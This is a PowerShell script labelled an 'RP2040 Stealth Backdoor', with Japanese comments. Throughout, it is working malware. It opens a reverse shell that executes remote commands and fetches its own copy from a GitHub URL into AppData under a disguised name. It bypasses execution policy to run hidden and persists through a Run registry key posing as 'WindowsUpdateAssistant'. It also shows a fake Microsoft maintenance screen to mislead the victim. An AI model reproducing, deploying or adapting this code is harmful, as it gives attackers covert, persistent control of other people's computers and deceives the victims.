# --- RP2040 Stealth Backdoor (Final Optimized Version) ---
# GitHub: 0rnot/RP2040/main/backdoor.ps1

function Start-ReverseShell {
    param(
        [string]$LHOST = "127.0.0.1",
        [int]$LPORT = 4444,
        [switch]$Background
    )

    $DestPath = "$env:APPDATA\Microsoft\Windows\explorer_update.ps1"

    # --- 1. バックグラウンドモード (本体) ---
    if ($Background) {
        while ($true) {
            try {
                $TCPClient = New-Object System.Net.Sockets.TCPClient($LHOST, $LPORT)
                $Stream = $TCPClient.GetStream()
                $Writer = New-Object System.IO.StreamWriter($Stream); $Writer.AutoFlush = $true
                $Reader = New-Object System.IO.StreamReader($Stream)

                $Writer.WriteLine("--- RP2040 Background Session: $($env:COMPUTERNAME) ---")
                $Writer.Write("PS " + (Get-Location).Path + "> ")

                while($TCPClient.Connected) {
                    if($Stream.DataAvailable) {
                        $Command = $Reader.ReadLine()
                        if ($Command -eq "exit") { break }
                        try {
                            $Result = Invoke-Expression $Command 2>&1 | Out-String
                        } catch {
                            $Result = $_.Exception.Message
                        }
                        $Writer.WriteLine($Result)
                        $Writer.Write("PS " + (Get-Location).Path + "> ")
                    }
                    Start-Sleep -Milliseconds 100
                }
                $TCPClient.Close()
            } catch {
                # 接続失敗時は30秒待機してリトライ
                Start-Sleep -Seconds 30
            }
        }
        return
    }

    # --- 2. デコイモード (可視ターミナルからの起動) ---

    # 自身の保存
    if (-not (Test-Path $DestPath)) {
        (New-Object Net.WebClient).DownloadFile("https://raw.githubusercontent.com/0rnot/RP2040/main/backdoor.ps1", $DestPath)
    }

    # バックグラウンドプロセスの生成 (WScript.Shellを使用)
    # 現在のターミナルとは独立したプロセスとして起動
    $ScriptBlock = ". '$DestPath'; Start-ReverseShell -LHOST $LHOST -LPORT $LPORT -Background"
    $LaunchCommand = "powershell.exe -ExecutionPolicy Bypass -Command `"$ScriptBlock`""
    
    try {
        $WshShell = New-Object -ComObject WScript.Shell
        $WshShell.Run($LaunchCommand, 0, $false)
    } catch {
        Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -Command `"$ScriptBlock`"" -WindowStyle Hidden
    }

    # 永続化設定 (再起動後も非表示で実行)
    $RegCommand = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command `". '$DestPath'; Start-ReverseShell -LHOST $LHOST -LPORT $LPORT -Background`""
    Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'WindowsUpdateAssistant' -Value $RegCommand

    # デコイ画面の表示
    Clear-Host
    Write-Host "Microsoft Windows [Version 10.0.19045.4170]" -ForegroundColor Gray
    Write-Host "(c) Microsoft Corporation. All rights reserved."
    Write-Host ""
    Write-Host "Starting system maintenance..." -ForegroundColor Cyan
    Start-Sleep -Seconds 2
    
    $prog = @(15, 32, 47, 68, 89, 94, 99)
    foreach ($p in $prog) {
        Write-Host "`rScanning system files... [$p%]" -NoNewline
        Start-Sleep -Seconds (Get-Random -Minimum 1 -Maximum 4)
    }
    Write-Host "`rScanning system files... [100%]"
    Write-Host "Optimization complete. Monitoring system stability..." -ForegroundColor Green
    Write-Host "Please do not close this window to ensure background tasks complete successfully."
    
    # ターミナルを維持
    while($true) { Start-Sleep -Seconds 60 }
}
